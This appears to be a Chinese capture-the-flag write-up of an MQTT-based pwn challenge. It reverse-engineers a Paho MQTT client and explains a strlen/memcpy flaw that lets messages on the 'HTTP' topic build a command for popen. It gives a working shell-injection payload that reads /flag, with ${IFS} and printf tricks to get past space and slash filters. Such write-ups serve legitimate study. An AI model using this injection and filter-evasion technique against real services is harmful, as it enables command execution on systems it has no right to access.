mqtt 库是 github 上开源的一个项目；该赛道的另一道题 babymqtt 放入 ida9 中会自动识别 go 导入的库。

这道题是赛后才解出来的，比赛时间应该是 2025 年 11 月左右。
比赛的时候也没解出来，赛后了解了 mqtt 协议之后才做出来的。所以这道题算是边学边解的。

解题

main 函数

原本想尝试在 ida 中分析 elf 的同时导入 so，但是发现好像怎么导入都无法识别。
只能单独分开分析了，好在 so 库还有符号。

mqtt 由 三种角色 组成：发布者 publisher、服务器 broker、订阅者 subscriber。
发布者本身也可以是订阅者。
发布者和订阅者都是客户端，服务器仅充当消息中转。

mqtt 根据 主题 来向各个客户端转发消息，主题通过 / 区分层级，例如：

chat  --  接收或发送至 chat 主题下的消息
sensor/temperature  --  接收/发送至 sensor 下 temperature 的消息

因为 so 库没有删除符号，所以可以通过 File -> Produce file -> Create C header file... 来导出 so 库的头文件到另一边进行分析。（虽说导入会报错，但是仍旧能够导入库内的很多结构体，对后续分析有点用）

知道这些信息之后，配合 so 静态分析，就应该可以看懂 main 函数了。

int __fastcall main(int argc, const char **argv, const char **envp)
{
  const char *brokerUrl; // rax
  char *brokerUrl1; // [rsp+18h] [rbp-8h]

  if ( argc <= 1 )
    brokerUrl = "tcp://localhost:9999";         // 服务器地址，默认连接到本地，也可以通过反代连接到主机（此处 pwn 运行在虚拟机）
  else
    brokerUrl = argv[1];
  brokerUrl1 = (char *)brokerUrl;
  printf("Using server at %s\n", brokerUrl);
  rc = MQTTClient_create(&client, brokerUrl1, "httpclient", 1, 0);// 类比创建套接字
  if ( rc )
  {
    printf("Failed to create client, return code %d\n", rc);
    rc = 1;
  }
  else
  {
    rc = MQTTClient_setCallbacks(client, 0, connlost, msgarrvd, delivered);// 设置回调函数，mqtt 库会自动调用这 3 个方法，分别处理连接丢失、消息接收、消息发送三种情况
    if ( rc )
    {
      printf("Failed to set callbacks, return code %d\n", rc);
      rc = 1;
    }
    else
    {
      conn_opts.keepAliveInterval = 20;
      conn_opts.cleansession = 1;
      rc = MQTTClient_connect(client, &conn_opts);// "MQTC\b"
      if ( !rc )                                // 发起连接
      {
        MQTTClient_subscribe(client, "HTTP", 1);// 订阅 HTTP 主题消息
        while ( 1 )
        {
          sleep(1u);
          msgsend("200");                       // 循环间隔 1 秒发送消息
          puts("waiting for message\n");
        }
      }
      printf("Failed to connect, return code %d\n", rc);
      rc = 1;
    }
    MQTTClient_destroy((__int64 *)&client);     // 退出
  }
  return rc;
}

整个 main 函数可以看作是建立 tcp 然后发消息那样。
首先调用 create 函数创建套接字，此处第 3 个参数 clientId，是 mqtt 中的客户端 id，用于唯一标识客户端连接与会话的重要字段，代表 pwn 以 httpclient 为客户端 id。
然后 setCallbacks 设置 mqtt 回调函数。
接下来 connect 尝试连接到 mqtt broker。
subscribe 订阅指定主题的消息，此处是 HTTP 这个主题，并指定 qos 为 1，表示消息至少传送一次。
最后循环调用 msgsend 函数，该函数里层还有内容。

查看 msgsend

ida 刚点进这个函数的时候可能没有自动识别结构体。没关系，注意到 MQTTClient_publishMessage 这个函数的调用，看签名：

int __fastcall MQTTClient_publishMessage(
        MQTTClient handle,
        const char *topicName,
        MQTTClient_message *message,
        MQTTClient_deliveryToken *deliveryToken)

注意到向这个函数传入的 pubmsg，本质是一个 MQTTClient_message 结构体，按 Y 键修改其类型即可。

__int64 __fastcall msgsend(char *arg)
{
  unsigned int v2; // [rsp+1Ch] [rbp-114h]
  char s[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 cookie; // [rsp+128h] [rbp-8h]

  cookie = __readfsqword(0x28u);
  snprintf(s, 0x100u, "{\"clientid\":\"%s\", \"message\":\"%s\"}", "httpclient", arg);
  pubmsg.payload = s;
  pubmsg.payloadlen = strlen(s);
  pubmsg.qos = 1;
  pubmsg.retained = 0;
  LODWORD(token) = 0;
  v2 = MQTTClient_publishMessage(client, "HTTP", &pubmsg, &token);
  if ( v2 )
  {
    printf("Failed to publish message, return code %d\n", v2);
    return 1;
  }
  return v2;
}

简单来说，就是设置了一些要发送的内容和参数，然后交由 mqtt 库进行发送。

msgarrvd 函数

既然能够接收数据了，那应该如何接收数据呢？漏洞又在哪呢？
还记得之前的：

rc = MQTTClient_setCallbacks(client, 0, connlost, msgarrvd, delivered);

此处的 msgarrvd 就是接收数据的逻辑。为什么？看文档：

https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aad27d07782991a4937ebf2f39a021f83
https://eclipse-paho.github.io/paho.mqtt.c/MQTTClient/html/_m_q_t_t_client_8h.html#aa42130dd069e7e949bcab37b6dce64a5

接收回调函数的签名如下：

typedef int MQTTClient_messageArrived(void *context, char *topicName, int topicLen, MQTTClient_message *message)
  • context 即前面创建的 “套接字”；
  • topicName 即主题名；
  • topicLen （？？？）；
  • message 接收到的消息；

整理一下：

__int64 __fastcall msgarrvd(void *context, char *topicName, int topicLen, MQTTClient_message *message)
{
  MQTTClient_message MQTTClient_message_; // [rsp+0h] [rbp-80h] BYREF
  unsigned __int64 cookie; // [rsp+78h] [rbp-8h]

  *(_QWORD *)&MQTTClient_message_.qos = context;
  MQTTClient_message_.payload = topicName;
  *(&MQTTClient_message_.payloadlen + 1) = topicLen;
  *(_QWORD *)MQTTClient_message_.struct_id = message;
  cookie = __readfsqword(0x28u);
  *(_QWORD *)&MQTTClient_message_.properties.count = message->payload;
  if ( (unsigned int)__isoc99_sscanf(
                       *(_QWORD *)&MQTTClient_message_.properties.count,
                       "{\"clientid\":\"%63[^\"]\",",
                       &MQTTClient_message_.properties.length) == 1
    && !strcmp((const char *)&MQTTClient_message_.properties.length, "httpclient") )
  {                                             // 如果接收到的信息包含了：
                                                // {"clientid":"xxx"
                                                // 并且 xxx = "httpclient"，
                                                // 说明是自己发送的消息，就忽略。
                                                // 此处表明，既是发布者 publisher，也是订阅者 subscriber
    MQTTClient_freeMessage(&MQTTClient_message_);
    MQTTClient_free(MQTTClient_message_.payload);
    return 1;
  }
  else                                          // 否则就是其他客户端发送的消息
  {
    http(*(void **)&MQTTClient_message_.properties.count);// 处理返回
    puts("Message arrived");                    // 在终端打印消息
    printf("     topic: %s\n", (const char *)MQTTClient_message_.payload);
    printf(
      "   message: %.*s\n",
      *(_DWORD *)(*(_QWORD *)MQTTClient_message_.struct_id + 8LL),
      *(const char **)(*(_QWORD *)MQTTClient_message_.struct_id + 16LL));
    MQTTClient_freeMessage(&MQTTClient_message_);// 结束
    MQTTClient_free(MQTTClient_message_.payload);
    return 1;
  }
}

通过上面那段 if 逻辑，可以知道该程序既是发布方也是订阅方，接收 HTTP 主题下的消息。

其中，http 方法是漏洞出现的位置。

{

  char buf[128]; // [rsp+B0h] [rbp-1A0h] BYREF

  memset(buf, 0, sizeof(buf));

（格式化字符串直接问的 ai，不然实在是看不懂）

  • %63[...]：扫描集，读取最多 63 个字符，存入参数，并自动补 \0。
  • [^...]：^ 在 [ 后表示 取反，即读取“不属于这些字符”的字符。
  • %*...：* 表示 抑制赋值，匹配但丢弃，不写入参数，也不计入 sscanf 返回值。

本质上和 http 差不多，只不过加了一些限制条件，例如路径后面不能再出现空格、/、. 等字符。
问题出现在 strlen 和 memcpy 这两个函数的使用上。
strlen 并不将空字符计入，这样导致 memcpy 无法复制到空字符。
也就是说，因为无法通过空字符截断之前的输入，通过多次调用这个函数，可以实现构造特定 shell 命令的效果。

调试

因为只有输入 index.html 才能触发 popen，所以要先构造一段占位符来填充需要的内容。例如：

GET /home/ctf/AAAAAAAAAA;cat /flag

注意，因为会在调用 sscanf 时截断空格，且在后续也会截断替换 /，所以需要替换成转义字符。

GET /home/ctf/AAAAAAAAAA;cat${IFS}${PATH:0:1}flag

此处并不是最终形式。为什么，等会往下看就知道了。先解释两个：

  • ${IFS} 空格（包括空格、制表符等符号）
  • ${PATH:0:1} 此处代表 /

gdb 断点命令：

b *$rebase(0x1925)
b *$rebase(0x1974)

通过 mqttx 发送消息，断下点后查看内存情况：

发送第二段数据 GET /home/ctf/index.html：

会发现似乎构造成功了，

但是执行 popen 时：

sh: 1: Bad substitution
Message arrived
     topic: HTTP
   message: GET /home/ctf/index.html

为什么？注意到 gdb 输出信息：

[Detaching vfork parent process 14136 after child exec]
[Inferior 1 (process 14136) detached]
process 14141 is executing new program: /usr/bin/dash
[Thread debugging using libthread_db enabled]

会发现，popen 调用的 shell 和我们平常用的 shell 并不同，其调用的是 /bin/sh / dash shell，而这个 shell 是没有 ${PATH:0:1} 这种说法的，于是就报错 sh: 1: Bad substitution 了。（这一段还是问 ai 才了解到的）
那要怎么做呢？很简单：

GET /home/ctf/AAAAAAAAAA;cat${IFS}$(printf${IFS}\\57)flag

通过这个 $(printf{$IFS}\\57) 语法自动生成一个斜杠。注意是两个反斜杠。

总结

mqtt + （http）+ 字符串函数的不正确使用。
